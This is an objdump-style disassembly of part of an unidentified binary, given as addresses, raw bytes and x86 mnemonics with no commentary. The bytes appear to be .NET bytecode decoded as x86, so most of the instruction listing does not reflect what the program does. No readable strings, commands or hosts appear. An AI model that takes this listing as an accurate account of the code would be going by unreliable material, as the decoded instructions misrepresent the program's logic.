  403690:	08 00                	or     %al,(%eax)
  403692:	00 04 7e             	add    %al,(%esi,%edi,2)
  403695:	0e                   	push   %cs
  403696:	00 00                	add    %al,(%eax)
  403698:	04 7e                	add    $0x7e,%al
  40369a:	04 00                	add    $0x0,%al
  40369c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40369f:	67 00 00             	add    %al,(%bx,%si)
  4036a2:	0a 28                	or     (%eax),%ch
  4036a4:	25 00 00 06 2a       	and    $0x2a060000,%eax
  4036a9:	00 00                	add    %al,(%eax)
  4036ab:	00 1b                	add    %bl,(%ebx)
  4036ad:	30 05 00 88 02 00    	xor    %al,0x28800
  4036b3:	00 09                	add    %cl,(%ecx)
  4036b5:	00 00                	add    %al,(%eax)
  4036b7:	11 7e 05             	adc    %edi,0x5(%esi)
  4036ba:	00 00                	add    %al,(%eax)
  4036bc:	04 28                	add    $0x28,%al
  4036be:	6a 00                	push   $0x0
  4036c0:	00 0a                	add    %cl,(%edx)
  4036c2:	7e 06                	jle    0x4036ca
  4036c4:	00 00                	add    %al,(%eax)
  4036c6:	04 28                	add    $0x28,%al
  4036c8:	6b 00 00             	imul   $0x0,(%eax),%eax
  4036cb:	0a 73 6c             	or     0x6c(%ebx),%dh
  4036ce:	00 00                	add    %al,(%eax)
  4036d0:	0a 0a                	or     (%edx),%cl
  4036d2:	28 6d 00             	sub    %ch,0x0(%ebp)
  4036d5:	00 0a                	add    %cl,(%edx)
  4036d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4036d9:	00 00                	add    %al,(%eax)
  4036db:	0a 6f 6f             	or     0x6f(%edi),%ch
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	0a 0b                	or     (%ebx),%cl
  4036e2:	07                   	pop    %es
  4036e3:	06                   	push   %es
  4036e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e5:	70 00                	jo     0x4036e7
  4036e7:	00 0a                	add    %cl,(%edx)
  4036e9:	28 71 00             	sub    %dh,0x0(%ecx)
  4036ec:	00 0a                	add    %cl,(%edx)
  4036ee:	39 2a                	cmp    %ebp,(%edx)
  4036f0:	02 00                	add    (%eax),%al
  4036f2:	00 28                	add    %ch,(%eax)
  4036f4:	72 00                	jb     0x4036f6
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	0c 16                	or     $0x16,%al
  4036fa:	0d 38 3b 00 00       	or     $0x3b38,%eax
  4036ff:	00 08                	add    %cl,(%eax)
  403701:	09 a3 6a 00 00 01    	or     %esp,0x100006a(%ebx)
  403707:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40370a:	04 6f                	add    $0x6f,%al
  40370c:	6e                   	outsb  %ds:(%esi),(%dx)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	0a 6f 6f             	or     0x6f(%edi),%ch
  403712:	00 00                	add    %al,(%eax)
  403714:	0a 06                	or     (%esi),%al
  403716:	6f                   	outsl  %ds:(%esi),(%dx)
  403717:	70 00                	jo     0x403719
  403719:	00 0a                	add    %cl,(%edx)
  40371b:	28 2b                	sub    %ch,(%ebx)
  40371d:	00 00                	add    %al,(%eax)
  40371f:	0a 39                	or     (%ecx),%bh
  403721:	07                   	pop    %es
  403722:	00 00                	add    %al,(%eax)
  403724:	00 11                	add    %dl,(%ecx)
  403726:	04 6f                	add    $0x6f,%al
  403728:	73 00                	jae    0x40372a
  40372a:	00 0a                	add    %cl,(%edx)
  40372c:	dd 06                	fldl   (%esi)
  40372e:	00 00                	add    %al,(%eax)
  403730:	00 26                	add    %ah,(%esi)
  403732:	dd 00                	fldl   (%eax)
  403734:	00 00                	add    %al,(%eax)
  403736:	00 09                	add    %cl,(%ecx)
  403738:	17                   	pop    %ss
  403739:	58                   	pop    %eax
  40373a:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  40373f:	32 bf 28 49 00 00    	xor    0x4928(%edi),%bh
  403745:	06                   	push   %es
  403746:	39 71 00             	cmp    %esi,0x0(%ecx)
  403749:	00 00                	add    %al,(%eax)
  40374b:	73 74                	jae    0x4037c1
  40374d:	00 00                	add    %al,(%eax)
  40374f:	0a 13                	or     (%ebx),%dl
  403751:	05 11 05 72 4d       	add    $0x4d720511,%eax
  403756:	15 00 70 6f 75       	adc    $0x756f7000,%eax
  40375b:	00 00                	add    %al,(%eax)
  40375d:	0a 11                	or     (%ecx),%dl
  40375f:	05 1b 8d 48 00       	add    $0x488d1b,%eax
  403764:	00 01                	add    %al,(%ecx)
  403766:	25 16 72 55 15       	and    $0x15557216,%eax
  40376b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40376e:	25 17 06 6f 76       	and    $0x766f0617,%eax
  403773:	00 00                	add    %al,(%eax)
  403775:	0a 28                	or     (%eax),%ch
  403777:	77 00                	ja     0x403779
  403779:	00 0a                	add    %cl,(%edx)
  40377b:	a2 25 18 72 bf       	mov    %al,0xbf721825
  403780:	15 00 70 a2 25       	adc    $0x25a27000,%eax
  403785:	19 06                	sbb    %eax,(%esi)
  403787:	6f                   	outsl  %ds:(%esi),(%dx)
  403788:	70 00                	jo     0x40378a
  40378a:	00 0a                	add    %cl,(%edx)
  40378c:	a2 25 1a 72 d1       	mov    %al,0xd1721a25
  403791:	15 00 70 a2 28       	adc    $0x28a27000,%eax
  403796:	78 00                	js     0x403798
  403798:	00 0a                	add    %cl,(%edx)
  40379a:	6f                   	outsl  %ds:(%esi),(%dx)
  40379b:	79 00                	jns    0x40379d
  40379d:	00 0a                	add    %cl,(%edx)
  40379f:	11 05 17 6f 7a 00    	adc    %eax,0x7a6f17
  4037a5:	00 0a                	add    %cl,(%edx)
  4037a7:	11 05 17 6f 7b 00    	adc    %eax,0x7b6f17
  4037ad:	00 0a                	add    %cl,(%edx)
  4037af:	11 05 28 7c 00 00    	adc    %eax,0x7c28
  4037b5:	0a 26                	or     (%esi),%ah
  4037b7:	38 4d 00             	cmp    %cl,0x0(%ebp)
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	7e 7d                	jle    0x40383b
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 72 e5             	or     -0x1b(%edx),%dh
  4037c3:	15 00 70 18 6f       	adc    $0x6f187000,%eax
  4037c8:	7e 00                	jle    0x4037ca
  4037ca:	00 0a                	add    %cl,(%edx)
  4037cc:	13 06                	adc    (%esi),%eax
  4037ce:	11 06                	adc    %eax,(%esi)
  4037d0:	06                   	push   %es
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	76 00                	jbe    0x4037d4
  4037d4:	00 0a                	add    %cl,(%edx)
  4037d6:	28 77 00             	sub    %dh,0x0(%edi)
  4037d9:	00 0a                	add    %cl,(%edx)
  4037db:	72 43                	jb     0x403820
  4037dd:	16                   	push   %ss
  4037de:	00 70 06             	add    %dh,0x6(%eax)
  4037e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e2:	70 00                	jo     0x4037e4
  4037e4:	00 0a                	add    %cl,(%edx)
  4037e6:	72 43                	jb     0x40382b
  4037e8:	16                   	push   %ss
  4037e9:	00 70 28             	add    %dh,0x28(%eax)
  4037ec:	7f 00                	jg     0x4037ee
  4037ee:	00 0a                	add    %cl,(%edx)
  4037f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f1:	80 00 00             	addb   $0x0,(%eax)
  4037f4:	0a dd                	or     %ch,%bl
  4037f6:	0f 00 00             	sldt   (%eax)
  4037f9:	00 11                	add    %dl,(%ecx)
  4037fb:	06                   	push   %es
  4037fc:	39 07                	cmp    %eax,(%edi)
  4037fe:	00 00                	add    %al,(%eax)
  403800:	00 11                	add    %dl,(%ecx)
  403802:	06                   	push   %es
  403803:	6f                   	outsl  %ds:(%esi),(%dx)
  403804:	27                   	daa
  403805:	00 00                	add    %al,(%eax)
  403807:	0a dc                	or     %ah,%bl
  403809:	06                   	push   %es
  40380a:	6f                   	outsl  %ds:(%esi),(%dx)
  40380b:	70 00                	jo     0x40380d
  40380d:	00 0a                	add    %cl,(%edx)
  40380f:	28 81 00 00 0a 39    	sub    %al,0x390a0000(%ecx)
  403815:	15 00 00 00 06       	adc    $0x6000000,%eax
  40381a:	6f                   	outsl  %ds:(%esi),(%dx)
  40381b:	70 00                	jo     0x40381d
  40381d:	00 0a                	add    %cl,(%edx)
  40381f:	28 82 00 00 0a 20    	sub    %al,0x200a0000(%edx)
  403825:	e8 03 00 00 28       	call   0x2840382d
  40382a:	17                   	pop    %ss
  40382b:	00 00                	add    %al,(%eax)
  40382d:	0a 06                	or     (%esi),%al
  40382f:	6f                   	outsl  %ds:(%esi),(%dx)
  403830:	70 00                	jo     0x403832
  403832:	00 0a                	add    %cl,(%edx)
  403834:	17                   	pop    %ss
  403835:	73 83                	jae    0x4037ba
  403837:	00 00                	add    %al,(%eax)
  403839:	0a 07                	or     (%edi),%al
  40383b:	28 84 00 00 0a 13 07 	sub    %al,0x7130a00(%eax,%eax,1)
  403842:	11 07                	adc    %eax,(%edi)
  403844:	16                   	push   %ss
  403845:	11 07                	adc    %eax,(%edi)
  403847:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40384a:	51                   	push   %ecx
  40384b:	00 00                	add    %al,(%eax)
  40384d:	0a 28                	or     (%eax),%ch
  40384f:	4a                   	dec    %edx
  403850:	00 00                	add    %al,(%eax)
  403852:	06                   	push   %es
  403853:	28 85 00 00 0a 72    	sub    %al,0x720a0000(%ebp)
  403859:	47                   	inc    %edi
  40385a:	16                   	push   %ss
  40385b:	00 70 28             	add    %dh,0x28(%eax)
  40385e:	86 00                	xchg   %al,(%eax)
  403860:	00 0a                	add    %cl,(%edx)
  403862:	13 08                	adc    (%eax),%ecx
  403864:	11 08                	adc    %ecx,(%eax)
  403866:	73 87                	jae    0x4037ef
  403868:	00 00                	add    %al,(%eax)
  40386a:	0a 13                	or     (%ebx),%dl
  40386c:	09 11                	or     %edx,(%ecx)
  40386e:	09 72 51             	or     %esi,0x51(%edx)
  403871:	16                   	push   %ss
  403872:	00 70 6f             	add    %dh,0x6f(%eax)
  403875:	88 00                	mov    %al,(%eax)
  403877:	00 0a                	add    %cl,(%edx)
  403879:	11 09                	adc    %ecx,(%ecx)
  40387b:	72 65                	jb     0x4038e2
  40387d:	16                   	push   %ss
  40387e:	00 70 6f             	add    %dh,0x6f(%eax)
  403881:	88 00                	mov    %al,(%eax)
  403883:	00 0a                	add    %cl,(%edx)
  403885:	11 09                	adc    %ecx,(%ecx)
  403887:	72 85                	jb     0x40380e
  403889:	16                   	push   %ss
  40388a:	00 70 06             	add    %dh,0x6(%eax)
  40388d:	6f                   	outsl  %ds:(%esi),(%dx)
  40388e:	70 00                	jo     0x403890
  403890:	00 0a                	add    %cl,(%edx)
  403892:	72 43                	jb     0x4038d7
  403894:	16                   	push   %ss
  403895:	00 70 28             	add    %dh,0x28(%eax)
  403898:	7f 00                	jg     0x40389a
  40389a:	00 0a                	add    %cl,(%edx)
  40389c:	6f                   	outsl  %ds:(%esi),(%dx)
  40389d:	88 00                	mov    %al,(%eax)
  40389f:	00 0a                	add    %cl,(%edx)
  4038a1:	11 09                	adc    %ecx,(%ecx)
  4038a3:	72 9b                	jb     0x403840
  4038a5:	16                   	push   %ss
  4038a6:	00 70 28             	add    %dh,0x28(%eax)
  4038a9:	89 00                	mov    %eax,(%eax)
  4038ab:	00 0a                	add    %cl,(%edx)
  4038ad:	28 86 00 00 0a 6f    	sub    %al,0x6f0a0000(%esi)
  4038b3:	88 00                	mov    %al,(%eax)
  4038b5:	00 0a                	add    %cl,(%edx)
  4038b7:	11 09                	adc    %ecx,(%ecx)
  4038b9:	72 a3                	jb     0x40385e
  4038bb:	16                   	push   %ss
  4038bc:	00 70 11             	add    %dh,0x11(%eax)
  4038bf:	08 28                	or     %ch,(%eax)
  4038c1:	8a 00                	mov    (%eax),%al
  4038c3:	00 0a                	add    %cl,(%edx)
  4038c5:	72 af                	jb     0x403876
  4038c7:	16                   	push   %ss
  4038c8:	00 70 28             	add    %dh,0x28(%eax)
  4038cb:	7f 00                	jg     0x4038cd
  4038cd:	00 0a                	add    %cl,(%edx)
  4038cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d0:	88 00                	mov    %al,(%eax)
  4038d2:	00 0a                	add    %cl,(%edx)
  4038d4:	dd 0f                	fisttpll (%edi)
  4038d6:	00 00                	add    %al,(%eax)
  4038d8:	00 11                	add    %dl,(%ecx)
  4038da:	09 39                	or     %edi,(%ecx)
  4038dc:	07                   	pop    %es
  4038dd:	00 00                	add    %al,(%eax)
  4038df:	00 11                	add    %dl,(%ecx)
  4038e1:	09 6f 27             	or     %ebp,0x27(%edi)
  4038e4:	00 00                	add    %al,(%eax)
  4038e6:	0a dc                	or     %ah,%bl
  4038e8:	73 74                	jae    0x40395e
  4038ea:	00 00                	add    %al,(%eax)
  4038ec:	0a 25 11 08 6f 75    	or     0x756f0811,%ah
  4038f2:	00 00                	add    %al,(%eax)
  4038f4:	0a 25 17 6f 7b 00    	or     0x7b6f17,%ah
  4038fa:	00 0a                	add    %cl,(%edx)
  4038fc:	25 16 6f 8b 00       	and    $0x8b6f16,%eax
  403901:	00 0a                	add    %cl,(%edx)
  403903:	25 16 6f 8c 00       	and    $0x8c6f16,%eax
  403908:	00 0a                	add    %cl,(%edx)
  40390a:	25 17 6f 7a 00       	and    $0x7a6f17,%eax
  40390f:	00 0a                	add    %cl,(%edx)
  403911:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403915:	0a 26                	or     (%esi),%ah
  403917:	16                   	push   %ss
  403918:	28 19                	sub    %bl,(%ecx)
  40391a:	00 00                	add    %al,(%eax)
  40391c:	0a dd                	or     %ch,%bl
  40391e:	1d 00 00 00 13       	sbb    $0x13000000,%eax
  403923:	0a 72 bf             	or     -0x41(%edx),%dh
  403926:	16                   	push   %ss
  403927:	00 70 11             	add    %dh,0x11(%eax)
  40392a:	0a 6f 58             	or     0x58(%edi),%ch
  40392d:	00 00                	add    %al,(%eax)
  40392f:	0a 28                	or     (%eax),%ch
  403931:	86 00                	xchg   %al,(%eax)
  403933:	00 0a                	add    %cl,(%edx)
  403935:	28 26                	sub    %ah,(%esi)
  403937:	00 00                	add    %al,(%eax)
  403939:	06                   	push   %es
  40393a:	dd 00                	fldl   (%eax)
  40393c:	00 00                	add    %al,(%eax)
  40393e:	00 2a                	add    %ch,(%edx)
  403940:	41                   	inc    %ecx
  403941:	64 00 00             	add    %al,%fs:(%eax)
  403944:	00 00                	add    %al,(%eax)
  403946:	00 00                	add    %al,(%eax)
  403948:	51                   	push   %ecx
  403949:	00 00                	add    %al,(%eax)
  40394b:	00 28                	add    %ch,(%eax)
  40394d:	00 00                	add    %al,(%eax)
  40394f:	00 79 00             	add    %bh,0x0(%ecx)
  403952:	00 00                	add    %al,(%eax)
  403954:	06                   	push   %es
  403955:	00 00                	add    %al,(%eax)
  403957:	00 01                	add    %al,(%ecx)
  403959:	00 00                	add    %al,(%eax)
  40395b:	01 02                	add    %eax,(%edx)
  40395d:	00 00                	add    %al,(%eax)
  40395f:	00 16                	add    %dl,(%esi)
  403961:	01 00                	add    %eax,(%eax)
  403963:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403966:	00 00                	add    %al,(%eax)
  403968:	42                   	inc    %edx
  403969:	01 00                	add    %eax,(%eax)
  40396b:	00 0f                	add    %cl,(%edi)
  40396d:	00 00                	add    %al,(%eax)
  40396f:	00 00                	add    %al,(%eax)
  403971:	00 00                	add    %al,(%eax)
  403973:	00 02                	add    %al,(%edx)
  403975:	00 00                	add    %al,(%eax)
  403977:	00 b5 01 00 00 6c    	add    %dh,0x6c000001(%ebp)
  40397d:	00 00                	add    %al,(%eax)
  40397f:	00 21                	add    %ah,(%ecx)
  403981:	02 00                	add    (%eax),%al
  403983:	00 0f                	add    %cl,(%edi)
	...
  403991:	00 00                	add    %al,(%eax)
  403993:	00 6a 02             	add    %ch,0x2(%edx)
  403996:	00 00                	add    %al,(%eax)
  403998:	6a 02                	push   $0x2
  40399a:	00 00                	add    %al,(%eax)
  40399c:	1d 00 00 00 41       	sbb    $0x41000000,%eax
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	01 1b                	add    %ebx,(%ebx)
  4039a5:	30 02                	xor    %al,(%edx)
  4039a7:	00 32                	add    %dh,(%edx)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	00 16                	add    %dl,(%esi)
  4039b1:	28 2b                	sub    %ch,(%ebx)
  4039b3:	00 00                	add    %al,(%eax)
  4039b5:	06                   	push   %es
  4039b6:	7e 21                	jle    0x4039d9
  4039b8:	00 00                	add    %al,(%eax)
  4039ba:	04 6f                	add    $0x6f,%al
  4039bc:	8e 00                	mov    (%eax),%es
  4039be:	00 0a                	add    %cl,(%edx)
  4039c0:	14 fe                	adc    $0xfe,%al
  4039c2:	06                   	push   %es
  4039c3:	2e 00 00             	add    %al,%cs:(%eax)
  4039c6:	06                   	push   %es
  4039c7:	73 8f                	jae    0x403958
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 73 90             	or     -0x70(%ebx),%dh
  4039ce:	00 00                	add    %al,(%eax)
  4039d0:	0a 80 21 00 00 04    	or     0x4000021(%eax),%al
  4039d6:	dd 06                	fldl   (%esi)
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	00 26                	add    %ah,(%esi)
  4039dc:	dd 00                	fldl   (%eax)
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	00 2a                	add    %ch,(%edx)
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	01 10                	add    %edx,(%eax)
  4039e6:	00 00                	add    %al,(%eax)
  4039e8:	00 00                	add    %al,(%eax)
  4039ea:	06                   	push   %es
  4039eb:	00 25 2b 00 06 01    	add    %ah,0x106002b
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	01 13                	add    %edx,(%ebx)
  4039f5:	30 02                	xor    %al,(%edx)
  4039f7:	00 42 01             	add    %al,0x1(%edx)
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	0a 00                	or     (%eax),%al
  4039fe:	00 11                	add    %dl,(%ecx)
  403a00:	38 32                	cmp    %dh,(%edx)
  403a02:	01 00                	add    %eax,(%eax)
  403a04:	00 18                	add    %bl,(%eax)
  403a06:	16                   	push   %ss
  403a07:	28 31                	sub    %dh,(%ecx)
  403a09:	00 00                	add    %al,(%eax)
  403a0b:	06                   	push   %es
  403a0c:	0a 12                	or     (%edx),%dl
  403a0e:	01 fe                	add    %edi,%esi
  403a10:	15 08 00 00 02       	adc    $0x2000008,%eax
  403a15:	12 01                	adc    (%ecx),%al
  403a17:	d0 08                	rorb   $1,(%eax)
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	02 28                	add    (%eax),%ch
  403a1d:	62 00                	bound  %eax,(%eax)
  403a1f:	00 0a                	add    %cl,(%edx)
  403a21:	28 91 00 00 0a 7d    	sub    %dl,0x7d0a0000(%ecx)
  403a27:	23 00                	and    (%eax),%eax
  403a29:	00 04 06             	add    %al,(%esi,%eax,1)
  403a2c:	12 01                	adc    (%ecx),%al
  403a2e:	28 32                	sub    %dh,(%edx)
  403a30:	00 00                	add    %al,(%eax)
  403a32:	06                   	push   %es
  403a33:	39 f1                	cmp    %esi,%ecx
  403a35:	00 00                	add    %al,(%eax)
  403a37:	00 07                	add    %al,(%edi)
  403a39:	7b 25                	jnp    0x403a60
  403a3b:	00 00                	add    %al,(%eax)
  403a3d:	04 0c                	add    $0xc,%al
  403a3f:	07                   	pop    %es
  403a40:	7b 2c                	jnp    0x403a6e
  403a42:	00 00                	add    %al,(%eax)
  403a44:	04 0d                	add    $0xd,%al
  403a46:	09 72 e3             	or     %esi,-0x1d(%edx)
  403a49:	16                   	push   %ss
  403a4a:	00 70 28             	add    %dh,0x28(%eax)
  403a4d:	2f                   	das
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	06                   	push   %es
  403a51:	3a c0                	cmp    %al,%al
  403a53:	00 00                	add    %al,(%eax)
  403a55:	00 09                	add    %cl,(%ecx)
  403a57:	72 fb                	jb     0x403a54
  403a59:	16                   	push   %ss
  403a5a:	00 70 28             	add    %dh,0x28(%eax)
  403a5d:	2f                   	das
  403a5e:	00 00                	add    %al,(%eax)
  403a60:	06                   	push   %es
  403a61:	3a b0 00 00 00 09    	cmp    0x9000000(%eax),%dh
  403a67:	72 1f                	jb     0x403a88
  403a69:	17                   	pop    %ss
  403a6a:	00 70 28             	add    %dh,0x28(%eax)
  403a6d:	2f                   	das
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	06                   	push   %es
  403a71:	3a a0 00 00 00 09    	cmp    0x9000000(%eax),%ah
  403a77:	72 37                	jb     0x403ab0
  403a79:	17                   	pop    %ss
  403a7a:	00 70 28             	add    %dh,0x28(%eax)
  403a7d:	2f                   	das
  403a7e:	00 00                	add    %al,(%eax)
  403a80:	06                   	push   %es
  403a81:	3a 90 00 00 00 09    	cmp    0x9000000(%eax),%dl
  403a87:	72 4f                	jb     0x403ad8
  403a89:	17                   	pop    %ss
  403a8a:	00 70 28             	add    %dh,0x28(%eax)
  403a8d:	2f                   	das
  403a8e:	00 00                	add    %al,(%eax)
  403a90:	06                   	push   %es
  403a91:	3a 80 00 00 00 09    	cmp    0x9000000(%eax),%al
  403a97:	72 67                	jb     0x403b00
  403a99:	17                   	pop    %ss
  403a9a:	00 70 28             	add    %dh,0x28(%eax)
  403a9d:	2f                   	das
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	06                   	push   %es
  403aa1:	3a 70 00             	cmp    0x0(%eax),%dh
  403aa4:	00 00                	add    %al,(%eax)
  403aa6:	09 72 7f             	or     %esi,0x7f(%edx)
  403aa9:	17                   	pop    %ss
  403aaa:	00 70 28             	add    %dh,0x28(%eax)
  403aad:	2f                   	das
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	06                   	push   %es
  403ab1:	3a 60 00             	cmp    0x0(%eax),%ah
  403ab4:	00 00                	add    %al,(%eax)
  403ab6:	09 72 99             	or     %esi,-0x67(%edx)
  403ab9:	17                   	pop    %ss
  403aba:	00 70 28             	add    %dh,0x28(%eax)
  403abd:	2f                   	das
  403abe:	00 00                	add    %al,(%eax)
  403ac0:	06                   	push   %es
  403ac1:	3a 50 00             	cmp    0x0(%eax),%dl
  403ac4:	00 00                	add    %al,(%eax)
  403ac6:	09 72 af             	or     %esi,-0x51(%edx)
  403ac9:	17                   	pop    %ss
  403aca:	00 70 28             	add    %dh,0x28(%eax)
  403acd:	2f                   	das
  403ace:	00 00                	add    %al,(%eax)
  403ad0:	06                   	push   %es
  403ad1:	3a 40 00             	cmp    0x0(%eax),%al
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	09 72 e1             	or     %esi,-0x1f(%edx)
  403ad9:	17                   	pop    %ss
  403ada:	00 70 28             	add    %dh,0x28(%eax)
  403add:	2f                   	das
  403ade:	00 00                	add    %al,(%eax)
  403ae0:	06                   	push   %es
  403ae1:	3a 30                	cmp    (%eax),%dh
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 09                	add    %cl,(%ecx)
  403ae7:	72 fb                	jb     0x403ae4
  403ae9:	17                   	pop    %ss
  403aea:	00 70 28             	add    %dh,0x28(%eax)
  403aed:	2f                   	das
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	3a 20                	cmp    (%eax),%ah
  403af3:	00 00                	add    %al,(%eax)
  403af5:	00 09                	add    %cl,(%ecx)
  403af7:	72 13                	jb     0x403b0c
  403af9:	18 00                	sbb    %al,(%eax)
  403afb:	70 28                	jo     0x403b25
  403afd:	2f                   	das
  403afe:	00 00                	add    %al,(%eax)
  403b00:	06                   	push   %es
  403b01:	3a 10                	cmp    (%eax),%dl
  403b03:	00 00                	add    %al,(%eax)
  403b05:	00 09                	add    %cl,(%ecx)
  403b07:	72 51                	jb     0x403b5a
  403b09:	18 00                	sbb    %al,(%eax)
  403b0b:	70 28                	jo     0x403b35
  403b0d:	2f                   	das
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	06                   	push   %es
  403b11:	39 06                	cmp    %eax,(%esi)
  403b13:	00 00                	add    %al,(%eax)
  403b15:	00 08                	add    %cl,(%eax)
  403b17:	28 30                	sub    %dh,(%eax)
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	06                   	push   %es
  403b1c:	06                   	push   %es
  403b1d:	12 01                	adc    (%ecx),%al
  403b1f:	28 33                	sub    %dh,(%ebx)
  403b21:	00 00                	add    %al,(%eax)
  403b23:	06                   	push   %es
  403b24:	3a 0f                	cmp    (%edi),%cl
  403b26:	ff                   	(bad)
  403b27:	ff                   	(bad)
  403b28:	ff 06                	incl   (%esi)
  403b2a:	28 35 00 00 06 26    	sub    %dh,0x26060000
  403b30:	1f                   	pop    %ds
  403b31:	32 28                	xor    (%eax),%ch
  403b33:	17                   	pop    %ss
  403b34:	00 00                	add    %al,(%eax)
  403b36:	0a 28                	or     (%eax),%ch
  403b38:	2a 00                	sub    (%eax),%al
  403b3a:	00 06                	add    %al,(%esi)
  403b3c:	3a c4                	cmp    %ah,%al
  403b3e:	fe                   	(bad)
  403b3f:	ff                   	(bad)
  403b40:	ff 2a                	ljmp   *(%edx)
  403b42:	00 00                	add    %al,(%eax)
  403b44:	1b 30                	sbb    (%eax),%esi
  403b46:	03 00                	add    (%eax),%eax
  403b48:	e1 00                	loope  0x403b4a
  403b4a:	00 00                	add    %al,(%eax)
  403b4c:	0b 00                	or     (%eax),%eax
  403b4e:	00 11                	add    %dl,(%ecx)
  403b50:	28 94 00 00 0a 0a 73 	sub    %dl,0x730a0a00(%eax,%eax,1)
  403b57:	95                   	xchg   %eax,%ebp
  403b58:	00 00                	add    %al,(%eax)
  403b5a:	0a 25 17 6f 96 00    	or     0x966f17,%ah
  403b60:	00 0a                	add    %cl,(%edx)
  403b62:	25 19 6f 97 00       	and    $0x976f19,%eax
  403b67:	00 0a                	add    %cl,(%edx)
  403b69:	0b 72 6b             	or     0x6b(%edx),%esi
  403b6c:	18 00                	sbb    %al,(%eax)
  403b6e:	70 06                	jo     0x403b76
  403b70:	28 98 00 00 0a 07    	sub    %bl,0x70a0000(%eax)
  403b76:	73 99                	jae    0x403b11
  403b78:	00 00                	add    %al,(%eax)
  403b7a:	0a 72 8d             	or     -0x73(%edx),%dh
  403b7d:	18 00                	sbb    %al,(%eax)
  403b7f:	70 73                	jo     0x403bf4
  403b81:	9a 00 00 0a 0c 08 73 	lcall  $0x7308,$0xc0a0000
  403b88:	9b                   	fwait
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 0d 09 6f 9c 00    	or     0x9c6f09,%cl
  403b91:	00 0a                	add    %cl,(%edx)
  403b93:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403b96:	04 6f                	add    $0x6f,%al
  403b98:	9d                   	popf
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	0a 17                	or     (%edi),%dl
  403b9d:	3b 06                	cmp    (%esi),%eax
  403b9f:	00 00                	add    %al,(%eax)
  403ba1:	00 73 9e             	add    %dh,-0x62(%ebx)
  403ba4:	00 00                	add    %al,(%eax)
  403ba6:	0a 7a 11             	or     0x11(%edx),%bh
  403ba9:	04 28                	add    $0x28,%al
  403bab:	02 00                	add    (%eax),%al
  403bad:	00 2b                	add    %ch,(%ebx)
  403baf:	28 03                	sub    %al,(%ebx)
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	2b 6f a1             	sub    -0x5f(%edi),%ebp
  403bb6:	00 00                	add    %al,(%eax)
  403bb8:	0a 72 d5             	or     -0x2b(%edx),%dh
  403bbb:	18 00                	sbb    %al,(%eax)
  403bbd:	70 6f                	jo     0x403c2e
  403bbf:	a2 00 00 0a 6f       	mov    %al,0x6f0a0000
  403bc4:	a3 00 00 0a a5       	mov    %eax,0xa50a0000
  403bc9:	85 00                	test   %eax,(%eax)
  403bcb:	00 01                	add    %al,(%ecx)
  403bcd:	13 05 11 05 17 59    	adc    0x59170511,%eax
  403bd3:	45                   	inc    %ebp
  403bd4:	03 00                	add    (%eax),%eax
  403bd6:	00 00                	add    %al,(%eax)
  403bd8:	05 00 00 00 0d       	add    $0xd000000,%eax
  403bdd:	00 00                	add    %al,(%eax)
  403bdf:	00 15 00 00 00 38    	add    %dl,0x38000000
  403be5:	18 00                	sbb    %al,(%eax)
  403be7:	00 00                	add    %al,(%eax)
  403be9:	16                   	push   %ss
  403bea:	13 06                	adc    (%esi),%eax
  403bec:	dd 3d 00 00 00 17    	fnstsw 0x17000000
  403bf2:	13 06                	adc    (%esi),%eax
  403bf4:	dd 35 00 00 00 17    	fnsave 0x17000000
  403bfa:	13 06                	adc    (%esi),%eax
  403bfc:	dd 2d 00 00 00 16    	(bad) 0x16000000
  403c02:	13 06                	adc    (%esi),%eax
  403c04:	dd 25 00 00 00 11    	frstor 0x11000000
  403c0a:	04 39                	add    $0x39,%al
  403c0c:	07                   	pop    %es
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	00 11                	add    %dl,(%ecx)
  403c11:	04 6f                	add    $0x6f,%al
  403c13:	27                   	daa
  403c14:	00 00                	add    %al,(%eax)
  403c16:	0a dc                	or     %ah,%bl
  403c18:	09 39                	or     %edi,(%ecx)
  403c1a:	06                   	push   %es
  403c1b:	00 00                	add    %al,(%eax)
  403c1d:	00 09                	add    %cl,(%ecx)
  403c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403c20:	27                   	daa
  403c21:	00 00                	add    %al,(%eax)
  403c23:	0a dc                	or     %ah,%bl
  403c25:	26 16                	es push %ss
  403c27:	13 06                	adc    (%esi),%eax
